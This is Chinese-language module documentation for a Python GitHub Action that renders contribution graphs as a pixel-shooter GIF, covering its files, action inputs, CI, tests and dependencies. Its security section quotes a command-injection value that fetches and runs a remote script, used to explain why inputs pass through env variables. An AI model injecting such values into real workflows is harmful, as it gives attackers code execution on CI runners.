# 02 · 模块职责

---

## 1. 职责总览

| 文件 | 行数 | 角色 | 对外暴露面 | 可否独立执行 |
|------|------|------|------------------|-------------|
| `gh_pixel_pulverizer/__init__.py` | 44 | 包标记 + **版本号唯一来源** + **公共 API 统一导出** | `__version__` + 全部公共符号 | 否 |
| `gh_pixel_pulverizer/__main__.py` | 4 | `python -m` 入口 | — | 是（`python -m gh_pixel_pulverizer`） |
| `gh_pixel_pulverizer/cli.py` | 105 | **只做胶水**：argparse + 串流程 + 写 `$GITHUB_OUTPUT` | `main()` / `build_parser()` | 否（用 `python -m`） |
| `gh_pixel_pulverizer/config.py` | 119 | 纯常量：调色板 / 几何 / 可调参数 | 见 [03](./03-api-reference.md) §1 | 否 |
| `gh_pixel_pulverizer/models.py` | 92 | 7 个 `@dataclass` + `Strategy` 枚举 | 见 [03](./03-api-reference.md) §2 | 否 |
| `gh_pixel_pulverizer/font.py` | 123 | 自绘 5×7 点阵字体（HUD 用） | `draw_text()` / `text_width()` | 否 |
| `gh_pixel_pulverizer/data.py` | 101 | GraphQL 抓取 + 离线假数据 | `fetch_contributions()` / `generate_dummy()` | 否 |
| `gh_pixel_pulverizer/engine.py` | 391 | 玩法逻辑：状态机 / 更新 / 碰撞 / 主循环 | `Engine` | 否 |
| `gh_pixel_pulverizer/render.py` | 280 | 画面：`Renderer`（只读消费 Engine 状态）+ 飞船 sprite + 静态棋盘底 | `Renderer` | 否 |
| `gh_pixel_pulverizer/gif.py` | 69 | 编码：共享调色板 + 逐帧量化 | `build_palette()` / `quantize_frame()` / `encode_gif()` | 否 |
| `tests/test_smoke.py` | 184 | 离线冒烟测试（18 例） | — | 是（`python tests/test_smoke.py`） |
| `action.yml` | 150 | GitHub **Composite Action** 定义 | 11 个 inputs / 3 个 outputs | 由 workflow `uses:` 调用 |
| `.github/workflows/ci.yml` | 52 | 本仓库自身的 CI | artifact `game-gif-py*` | 由 GitHub 触发 |
| `pyproject.toml` | 40 | PEP 621 打包元数据 | console script | `pip install` |
| `.gitignore` | 12 | 忽略 `__pycache__/`、`*.gif` 等 | — | — |

---

## 2. `gh_pixel_pulverizer/__init__.py`

两个职责：

1. **作为版本号的唯一来源** —— `__version__ = "0.2.0"`。`pyproject.toml` 通过
`[tool.setuptools.dynamic] version = {attr = "gh_pixel_pulverizer.__version__"}` 读取，
避免在 `pyproject.toml` 与代码里两处维护、容易漂移。

2. **统一导出公共 API** —— 把 7 个模块的公共符号 re-export 到包根，
   外部只需要 `from gh_pixel_pulverizer import Engine`，不必知道内部文件划分。
   （`cli.py` 也保留了一组旧导入路径，保障 `from gh_pixel_pulverizer.cli import X` 不破。）

> 发版流程：只改这一行的 `__version__`，无需触碰 `pyproject.toml`。

---

## 3. `gh_pixel_pulverizer/__main__.py`

```python
from gh_pixel_pulverizer.cli import main

if __name__ == "__main__":
    main()
```

职责：让 `python -m gh_pixel_pulverizer <args>` 可用。
`if __name__` 守卫避免被 import 时副作用执行。

---

## 4. 业务模块

### 4.1 `config.py` —— 纯常量（依赖图的叶子）

调色板（`BG` / `GR_L1..L5` / `SHIP_*` / `STARS` / `PARTICLES` / `HUD*`）、画布几何
（`CELL` / `COLS` / `WIDTH` / `GRID_TOP` / `SHIP_Y`）、可调参数
（`DEFAULT_FPS` / `DEFAULT_COLORS` / `BULLET_PIERCE` / `TARGET_LOCK_FRAMES` / `SHIP_TRACK` /
`BULLET_TRAIL_*`），外加颜色工具 `_rgba()`。

**不 import 任何包内模块** —— 谁都可以安全地 import 它，不会有循环。

### 4.2 `models.py` —— 数据结构

`Target` / `Enemy` / `Bullet` / `Particle` / `Star` / `Contributions` 六个 `@dataclass`
+ `Strategy` 枚举。只有 `Target` 带三个派生属性（`cx` / `cy` / `rect()`），
不含任何更新或绘制逻辑。

### 4.3 `data.py` —— 数据来源

`GRAPHQL` 查询串、`fetch_contributions()`、`generate_dummy()`。
唯一网络出口；**任何失败都返回 `None`**，由 `cli.main()` 兜底到假数据。

### 4.4 `engine.py` —— 玩法逻辑

`Engine`：构建靶子 / 撒星星 / 每帧更新 / 开火 / 碰撞 / 爆炸 / 回收 / 主循环。
**一行 PIL 都不 import**，绘制全部委托给 `self.renderer`（`Renderer` 实例，构造时传入 `self`）。

### 4.5 `render.py` —— 绘制层

`Renderer(game)` 持有 Engine 引用，**只读**地取状态来画，从不修改游戏状态。
对外只有一个入口 `render(celebration=False)`，内部 8 个 `_draw_*` 按 z-order 依次落笔。

### 4.6 `gif.py` —— 编码

`_clamp_colors()` / `build_palette()` / `quantize_frame()` / `encode_gif()`。
体积相关的两个决策（关抖动、不指定 `disposal=2`）都在这里。

### 4.7 `font.py` —— 点阵字体

5×7 的 `GLYPHS` 表 + `draw_text()` / `text_width()`。为什么不用
`ImageFont.load_default()`：那个位图字体字形发虚、字宽不齐，右对齐只能靠
`len(name) * 6` 硬猜（用户名一长就飘出画布）。点阵字体每字固定 6px 步进，
`text_width()` 能精确算宽；`draw_text()` 把亮像素攒成一次 `d.point()`，
几十个字符也只有几十次绘制调用。

### 4.8 `cli.py` —— 胶水

`build_parser()` + `main()`：解析参数 → 取数据 → 建 Engine → 编码 → 写 `$GITHUB_OUTPUT`。
除此之外还 re-export 了一组旧符号（常量 / `Contributions` / `build_palette` / `quantize_frame`），
保证历史的 `from gh_pixel_pulverizer.cli import ...` 不破。

### 4.9 模块内部的调用关系

```
Engine (engine.py)
  ├── __init__ ──▶ _build_targets   （models.Target）
  │            ├──▶ _spawn_stars    （models.Star）
  │            └──▶ Renderer(self)  （render.py）
  ├── 每帧更新：_update_stars / _update_ship / _fire /
  │             _update_bullets / _update_enemies / _update_particles
  ├── _pick_target  （models.Strategy）
  ├── _collide ────▶ _explode       （models.Particle / Enemy）
  ├── _prune
  └── _render_frame ──▶ Renderer.render()
        └── _draw_grid_bg / _draw_stars / _draw_targets / _draw_enemies /
            _draw_bullets / _draw_ship / _draw_particles / _draw_hud
      ▲
      └── 被 iter_frames 逐帧 yield ──▶ run（兼容旧接口）

main (cli.py) ──▶ fetch_contributions 或 generate_dummy   （data.py）
             ──▶ Engine(contrib, ...)                     （engine.py）
             ──▶ encode_gif(engine.iter_frames(), ...)    （gif.py）
             ──▶ 写 $GITHUB_OUTPUT
```

### 4.10 私有方法命名约定

- `_update_*`（`engine.py`）：推进物理/逻辑，**有副作用**，不绘制。
- `_draw_*`（`render.py`）：只读当前状态，向 `ImageDraw` 写入，**不改变**游戏状态。
- `_pick_*` / `_auto_*`：纯策略计算。
- `_prune`：内存回收。
- 公开成员（`targets`、`score`、`defeated`、`total_targets`、`frame`）供测试与外部读取。

---

## 5. `action.yml` —— 对外交付形态

**Composite Action**（`runs.using: "composite"`），供其他仓库用
`uses: h1s97x/gh-pixel-pulverizer@main` 引用。

### 5.1 三个 step

| Step | 作用 | 关键点 |
|------|------|--------|
| ① 🐍 Check Python + Pillow | 缺失时才装 Pillow | 兼容 PEP 668 环境：`--break-system-packages` → 普通 → `pip` 三级降级 |
| ② 💥 Generate GIF | 生成 GIF | `cd ${{ github.action_path }}`；所有用户输入走 `env:`；`EXTRA=(--seed ...)` 数组拼参数，避免空字符串污染 argv |
| ③ 📦 Commit & Push | 提交产物 | 可由 `no-commit` 跳过；文件无变化则跳过；符合条件时 amend 上一次自己的 commit |

### 5.2 inputs → CLI 参数映射

| Action input | 默认 | CLI 参数 |
|--------------|------|----------|
| `github-token`（必填） | — | env `GH_TOKEN` |
| `username` | `""`（空则取仓库 owner） | 位置参数 `${{ inputs.username \|\| github.repository_owner }}` |
| `output-path` | `game.gif` | `-o` |
| `strategy` | `random` | `-s` |
| `fps` | `20` | `--fps` |
| `max-frame` | `0`（自动） | `--max-frame` |
| `boss-chance` | `0.18` | `--boss-chance` |
| `colors` | `32` | `--colors` |
| `seed` | `""`（留空 = 随机） | `--seed`（非空时才追加） |
| `no-amend` | `false` | 不传 CLI，控制 step ③ 行为 |
| `no-commit` | `false` | 不传 CLI，控制 step ③ 是否执行 |

### 5.3 outputs

`steps.generate.outputs.{output,frames,score}` —— 由 `main()` 写入 `$GITHUB_OUTPUT`
（`cli.py`）后由 GitHub 自动提升为 step outputs。
> 注意 `main()` 还会多写一行 `username=`，但 `action.yml` 只声明了 3 个 output。

### 5.4 安全设计（**不可退让**）

```yaml
env:
  GH_TOKEN: ${{ inputs.github-token }}
  INPUT_USERNAME: ${{ inputs.username || github.repository_owner }}
  ...
run: |
  python3 -m gh_pixel_pulverizer "${INPUT_USERNAME}" ...
```

**所有用户可控值一律经 `env:` 传递，再在脚本里以 `"$VAR"` 引用**。
若直接写成 `run: python -m gh_pixel_pulverizer "${{ inputs.username }}"`，攻击者只需在 issue/workflow 输入里
填 `$(curl evil.sh | bash)` 就能在 runner 上执行任意命令。这是历史提交 `94f4237` 修复的问题。

### 5.5 Step ③ 的提交策略

```
Pseudo:

if no-commit == 'true'                     → 完全跳过
if ! -f $OUTPUT                            → 退出（无产物）
git add -- $OUTPUT
if 暂存区中 $OUTPUT 无 diff                → 退出（内容没变，不污染历史）
if no-amend != 'true'
   and 没有其他已暂存改动
   and 没有其他未暂存改动
   and 上一条 commit message 形如 "💥*pixel-pulverizer*"
                                           → git commit --amend --no-edit && git push --force-with-lease
else                                       → 新建 commit "💥 pixel-pulverizer: update $GITHUB_RUN_ID" && git push
```

设计意图：**定时任务每天跑一次，若每次都新建 commit 会让贡献历史被自己的机器人刷屏**。
`amend` 使「每天更新同一张 GIF」在历史里始终只占一条记录。
三重条件（无其他改动 + 上条 commit 是我们写的）确保 amend **绝不会夹带或覆盖他人代码改动**。

---

## 6. `.github/workflows/ci.yml` —— 本仓库自身的 CI

| 配置 | 值 |
|------|-----|
| 触发 | `push` 到 `main`、`pull_request`、`workflow_dispatch` |
| 权限 | `contents: read`（最小权限原则） |
| 矩阵 | Python `3.9` / `3.12`，`fail-fast: false`（两个版本都跑完） |
| Step 1 | `actions/checkout@v4` |
| Step 2 | `actions/setup-python@v5` |
| Step 3 | `pip install --upgrade pip pillow` |
| Step 4 | `python -m unittest discover -s tests -v` |
| Step 5 | 端到端：`python -m gh_pixel_pulverizer octocat --offline -o game.gif --seed 7` + 断言 `size > 0` |
| Step 6 | `actions/upload-artifact@v4` 上传 `game.gif`，保留 7 天 |

> **注意**：CI 不安装本项目包，而是靠 `tests/test_smoke.py` 里手动 `sys.path.insert(0, 仓库根)` 来导包。
> 这让 CI 即使在 `pip install pillow` 之后也能直接测试源码树。

---

## 7. `tests/test_smoke.py` —— 详见 [06](./06-testing-and-ci.md)

唯一测试文件，5 个测试类：

| 类 | 关注点 |
|----|--------|
| `TestDummyData` | 假数据形状、确定性、不同用户差异性 |
| `TestTargets` | 分档合法性、分档铺开度、靶子不越界 |
| `TestEngine` | 自动帧数能否清场、显式帧数是否被遵守、死亡对象被回收、帧尺寸、seed 确定性、4 种策略、空数据不崩 |
| `TestGifEncoding` | 编解码逐帧一致（无残影）、支持生成器、色数限幅、空输入抛错 |
| `TestNetworkFailurePaths` | 无凭据时 API 优雅降级返回 `None` |

---

## 8. 模块间依赖图（谁 import 谁）

```
                     ┌────────────────────┐
                     │  tests/test_smoke  │
                     └─────────┬──────────┘
                               │ from gh_pixel_pulverizer import (...)
                               ▼
      ┌──────────────┐   ┌─────────────────────┐
      │ __main__.py  │──▶│       cli.py        │
      └──────────────┘   └──────────┬──────────┘
                                    │
        ┌───────────────┬───────────┼─────────────┬──────────────┐
        ▼               ▼           ▼             ▼              ▼
   ┌─────────┐    ┌──────────┐ ┌─────────┐  ┌─────────┐   ┌──────────┐
   │ data.py │    │ engine.py│ │ gif.py  │  │ models  │   │ config.py│
   └────┬────┘    └────┬─────┘ └────┬────┘  └────┬────┘   └────▲─────┘
        │              │            │            │             │
        │              ▼            │            │             │
        │        ┌───────────┐      │            │             │
        │        │ render.py │──────┼────────────┴─────────────┘
        │        └─────┬─────┘      │
        │              │ PIL        │ PIL
        └──────────────┼────────────┘
                       ▼
                 ┌──────────┐
                 │  pillow  │
                 └──────────┘

   __init__.py ← 被 pyproject.toml 的 dynamic.version 读取（构建期）
   __init__.py ← 把上面 6 个模块的公共符号 re-export 到包根
```

**没有循环依赖**：箭头一律指向下（基础）层。`config.py` 是依赖图的叶子，谁都能 import；
`render.py` 只在 `TYPE_CHECKING` 下引用 `Engine`（拿类型注解），运行时不 import `engine.py`，
因此 `engine → render` 这条边不会成环。

**唯一外部依赖仍是 pillow**，且只有 `render.py` 与 `gif.py` 会 import 它。
